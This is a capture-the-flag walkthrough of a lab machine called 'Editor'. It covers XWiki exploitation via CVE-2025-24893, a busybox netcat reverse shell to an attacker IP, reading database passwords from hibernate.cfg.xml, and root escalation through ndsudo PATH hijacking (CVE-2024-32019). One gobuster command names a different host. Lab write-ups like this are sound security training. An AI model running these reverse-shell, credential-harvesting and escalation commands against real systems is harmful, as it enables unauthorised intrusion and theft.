## Enumeration
We start with reconnaissance with `nmap`
```sh
mkdir nmap
nmap -sV -sC -oA editor 10.10.11.80
```

![](../../../attachments/Pasted%20image%2020251110182941.png)

We see that the server is configured to respond to the name `editor.htb` rather than the IP address `10.10.11.80`. See to resolve that we have to edit the `/etc/hosts` file and write 
`10.10.11.80  editor.htb`.

```sh
sudo nano /etc/hosts
```

After that if we type the IP address of the machine to our browser we will be able to see the Web application:

![](../../../attachments/Pasted%20image%2020251110183343.png)

Then we start enumerating the web application with `gobuster` to find common directories and files:
```sh
gobuster dir -u http://conversor.htb --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

![](../../../attachments/Pasted%20image%2020251110185012.png)

But we didn't find anything notable. So we go to the port 8080.

At the bottom of the page, we find `XWiki Debian 15.10.8`

![](../../../attachments/Pasted%20image%2020251110185148.png)

and if we search about this version on the Internet I found the vulnerability `CVE-2025-24893`. So now all we have to do is to find to exploit this vulnerability.

After a little search I found this code on GitHub:

![](../../../attachments/Pasted%20image%2020251110185448.png)

So I downloaded `CVE-2025-24893.py` from this repo, I ran `netcat` on the attacking machine
```sh
nc -nvlp 9000
```

we run this command in the same directory as the python script that I downloaded from GitHub:
```python
python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080' -c 'busybox nc 10.10.14.125 9000 -e /bin/bash'
```

![](../../../attachments/Pasted%20image%2020251110190159.png)

And then we get a shell: 

![](../../../attachments/Pasted%20image%2020251110190329.png)

Once we have a shell on the target machine, it’s a good idea to upgrade it to an interactive shell with:
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![](../../../attachments/Pasted%20image%2020251110190734.png)

Firstly, I examine the `/etc/passwd` file, which contains users with valid shell entries:
```sh
cat /etc/passwd | grep -i bash
```

![](../../../attachments/Pasted%20image%2020251110192828.png)

We find two users on the system: `root` and `oliver`, so a next logical move would be to lateral movement to `oliver`
```sh
ls -l /home/oliver
```

But we do not have permission to access Oliver's home directory:

![](../../../attachments/Pasted%20image%2020251110193108.png)

I tried to find the database but I didn't find it so next I try to investigate the local listening ports on the machine:

![](../../../attachments/Pasted%20image%2020251110193220.png)

And we see that MySQL on port 151 is running on the machine. So once again I try to find where is the database in XWiki and after searching for a bit I find XWiki database credentials are stored in `hibernate.cfg.xml`

![](../../../attachments/Pasted%20image%2020251110194115.png)

So I try to find the `hibernate.cfg.xml` :
```sh
find / -name hibernate.cfg.xml 2>/dev/null
```

![](../../../attachments/Pasted%20image%2020251110194343.png)

So I try to read the `/etc/xwiki/hibernate.cfg.xml` finding passwords:
```sh
grep -i pass /etc/xwiki/hibernate.cfg.xml
```

![](../../../attachments/Pasted%20image%2020251110194554.png)

And we find a password `theEd1t0rTeam99`. I wasn't sure if this was the password of `oliver` user but I tried to ssh and it worked!!!
So we get the user flag!!!

![](../../../attachments/Pasted%20image%2020251110194811.png)

## Privilege Escalation
Firstly, I try to run `sudo -l` but I wasn't able to get something important:

![](../../../attachments/Pasted%20image%2020251110195048.png)

After that I try Linux Privilege Escalation via SUIDs, and so I type
```sh
find / -perm -u=s -type f 2>/dev/null
```

![](../../../attachments/Pasted%20image%2020251110200425.png)

After a lot of search I find that `ndsudo` has a known vulnerability `CVE-2024-32019` and I was searching the this CVE I found from this website:

![](../../../attachments/Pasted%20image%2020251110200712.png)

that I can use the metasploit framework.

![](../../../attachments/Pasted%20image%2020251110200751.png)
But unfortunately I couldn't use the metasploit framework because it expected an already active session from metasploit where I have an initial foothold, so I didn't use it.

We will use the manual way:
I found this GitHub page that explains how to do it manually:

![](../../../attachments/Pasted%20image%2020251110210538.png)

In the attacking machine I write the following C code `nvme.c`:

![](../../../attachments/Pasted%20image%2020251110204246.png)
I compile the exploit:

![](../../../attachments/Pasted%20image%2020251110204341.png)

Then I open a Python server on the attacking machine
```python
python3 -m http.server 8002
```

Then on the target machine I download the `nvme`:
```sh
wget http://10.10.14.125:8002/nvme
chmod +x nvme
```

![](../../../attachments/Pasted%20image%2020251110211142.png)

Then I modify the `PATH`
```sh
export PATH=.:${PATH}
export PATH
```

![](../../../attachments/Pasted%20image%2020251110211316.png)

And finally I just trigger the exploit:
```sh
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

So I get the root flag!!!

![](../../../attachments/Pasted%20image%2020251110211524.png)

